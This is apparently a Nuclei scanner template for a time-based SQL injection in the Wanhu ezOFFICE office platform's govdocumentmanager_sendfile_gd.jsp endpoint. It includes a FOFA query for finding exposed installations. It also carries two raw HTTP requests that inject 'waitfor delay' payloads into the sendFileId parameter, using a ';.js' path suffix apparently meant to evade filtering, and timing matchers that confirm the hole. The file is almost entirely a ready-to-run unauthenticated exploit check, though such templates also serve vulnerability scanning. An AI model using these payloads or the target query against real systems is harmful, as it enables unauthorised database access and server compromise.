id: wanhu-oa-govdocumentmanager-sendfile-gd-jsp-sql-injection

info:
  name: "万户OA govdocumentmanager_sendfile_gd.jsp存在SQL注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    万户OA ezoffice是万户网络协同办公产品。万户ezOFFICE modules/govoffice/gov_documentmanager/govdocumentmanager_sendfile_gd.jsp 接口存在SQL注入漏洞，未授权的攻击者可利用此漏洞获取数据库权限，深入利用可获取服务器权限。

    fofa: app="ezOFFICE协同管理平台" || app="万户ezOFFICE协同管理平台" || app="万户网络-ezOFFICE
  tags: 万户OA

http:
- raw:
  - |
    GET /defaultroot/modules/govoffice/govdocumentmanager/govdocumentmanager_sendfile_gd.jsp;.js?sendFileId=1;waitfor delay'0:0:5'-- HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Connection: close
  - |
    GET /defaultroot/modules/govoffice/govdocumentmanager/govdocumentmanager_sendfile_gd.jsp;.js?sendFileId=1;waitfor delay'0:0:8'-- HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Connection: close
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=5 && duration_1<=6'
    - 'duration_2>=8 && duration_2<=9'
    condition: and
